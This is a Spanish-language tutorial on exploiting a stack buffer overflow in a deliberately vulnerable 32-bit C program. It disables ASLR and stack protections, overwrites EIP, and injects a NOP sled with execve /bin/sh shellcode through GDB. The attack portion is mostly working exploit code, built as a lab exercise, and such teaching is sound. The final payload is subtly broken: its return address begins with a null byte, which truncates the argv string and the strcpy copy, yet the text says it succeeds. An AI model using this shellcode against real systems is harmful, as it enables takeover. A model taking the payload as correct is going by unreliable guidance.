# Tutorial: Buffer Overflow en x86 (32 bits)

Este tutorial demuestra cómo explotar una vulnerabilidad de Buffer Overflow en la arquitectura x86 (32 bits).

## Preparación del Entorno
Para que los exploits funcionen de manera predecible en las pruebas, debemos deshabilitar la aleatorización del espacio de direcciones (ASLR):
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

---

## Ejemplo 1: Buffer Overflow Básico (Crash / Denegación de Servicio)

En este ejemplo causaremos un fallo de segmentación (Segmentation Fault) sobrescribiendo el registro EIP (Instruction Pointer).

### Código Vulnerable (`vuln1.c`)
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *str) {
    char buffer[64];
    // strcpy no verifica el tamaño del destino, causando el desbordamiento
    strcpy(buffer, str);
    printf("Datos copiados: %s\n", buffer);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Uso: %s <texto>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
```

### Instrucciones de Compilación
Para que el programa sea vulnerable, compilamos forzando la arquitectura de 32 bits (`-m32`), desactivando las protecciones de la pila (`-fno-stack-protector`) y habilitando la ejecución en la pila (`-z execstack`):
```bash
gcc -m32 -fno-stack-protector -z execstack -g vuln1.c -o vuln1
```

### Revisión con GDB
1. Abrimos el binario con GDB:
   ```bash
   gdb -q ./vuln1
   ```
2. Ejecutamos el programa enviando una cantidad de datos mayor al tamaño del buffer (64 bytes) más el saved EBP (4 bytes), es decir, más de 68 bytes.
   ```gdb
   (gdb) run $(python3 -c "print('A' * 68 + 'B' * 4)")
   ```
3. El programa sufrirá un "Segmentation fault" al intentar retornar a la dirección `0x42424242` (`BBBB`), confirmando que controlamos el registro EIP.

---

## Ejemplo 2: Buffer Overflow con Ejecución de Código (Shellcode)

Ahora inyectaremos código ejecutable (shellcode) en la pila y redirigiremos el flujo de ejecución hacia él para obtener una shell interactiva.

### Código Vulnerable (`vuln2.c`)
(Puedes usar el mismo código vulnerable del Ejemplo 1).

### Instrucciones de Compilación
```bash
gcc -m32 -fno-stack-protector -z execstack -g vuln2.c -o vuln2
```

### Revisión y Explotación con GDB

1. **Obtener la dirección de la pila (buffer):**
   Abre GDB, pon un breakpoint en la función y busca la dirección en la pila.
   ```bash
   gdb -q ./vuln2
   (gdb) break vulnerable_function
   (gdb) run $(python3 -c "print('A' * 68 + 'B' * 4)")
   (gdb) next
   (gdb) x/20x $esp
   ```
   Identifica la dirección donde empiezan tus 'A's (por ejemplo, `0xffffd100`).

2. **Preparar el Shellcode:**
   Usaremos un shellcode básico de 23 bytes para Linux x86 que ejecuta `/bin/sh`:
   `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`

3. **Construir el Payload y Ejecutar:**
   El payload estará compuesto por: `[NOP Sled] + [Shellcode] + [Padding] + [Dirección de Retorno]`.
   - NOP Sled: Instrucciones vacías (`\x90`) que deslizan la ejecución hasta el shellcode.
   - Retorno: Suponiendo que nuestro buffer empieza en `0xffffd100`, lo escribimos en Little Endian (`\x00\xd1\xff\xff`).

   Dentro de GDB, ejecutamos el payload:
   ```gdb
   (gdb) run $(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*30 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + b'A'*15 + b'\x00\xd1\xff\xff')")
   ```
   *Nota:* Al ejecutarse exitosamente, el flujo saltará a la pila, deslizará por los NOPs, ejecutará el shellcode y GDB te notificará que ha iniciado un nuevo proceso (`/bin/dash` o `/bin/sh`).
